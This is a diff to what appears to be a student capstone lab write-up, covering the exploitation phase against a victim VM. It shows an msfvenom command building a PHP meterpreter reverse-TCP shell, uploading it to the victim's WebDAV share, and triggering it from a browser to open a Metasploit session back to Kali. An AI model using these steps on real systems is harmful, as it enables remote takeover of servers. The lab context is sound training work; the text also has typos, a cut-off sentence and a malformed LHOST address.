@@ -132,9 +132,11 @@ c) **Exploitation**
 
 - `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1.90 LPORT=666 -f raw > shell.php`
 
-- Once the 
+- Once shell.php is generated then you can copy it into `dav://192.168.1.105/webdav/` from the browser - this can be done from Kali Linux. In other words you will be 
 
-- Run the malacious shell script on the Victim (Capstone) VM
+- Now in Kali Linux run **Metasploit** and run the following commands to prepare for listening and retrograde connection of the  Capstone VM(victim) with Kali Linux
+
+- Run the malacious shell script on the Victim (Capstone) VM, you can actally run this from Kali linux by typing ` 192.168.1.105/webdav/shell.php` into the browser
 
 - Set the Lhost etc on metasploit. Once the script is run, the shell will switch to meterpreter
 
